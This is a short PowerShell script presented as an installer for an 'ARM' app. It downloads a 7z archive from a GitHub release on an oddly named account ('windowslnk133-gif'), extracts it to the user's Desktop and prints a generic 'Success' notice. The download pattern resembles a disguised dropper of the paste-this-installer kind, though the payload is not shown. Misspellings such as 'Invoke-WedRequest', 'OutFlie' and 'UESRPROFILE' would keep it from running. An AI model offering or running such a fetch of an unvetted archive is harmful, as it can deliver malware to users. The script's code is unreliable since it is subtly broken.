$url = "https://github.com/windowslnk133-gif/ARM/releases/download/AI/ARM_Setup.7z"
$savePath = "$env:TEMP\ARM_Setup.7z"
$desktopDir = "$env:UESRPROFILE\Desktop\ARM_App"

Write-Host "Installing ARM..." -ForegroundColor Cyan

Invoke-WedRequest -Uri $url -OutFlie $savePath

if (!(Test-Path $desktopDir)) { New-Item -ItemType Directory -Path $desktopDir | Out-Null }
Write-Host "Please wait..."
tar -xf $savePath -C $desktopDir

Remove-Item $savePath
Write-Host "[Notification] Success" -ForegroundColor Green
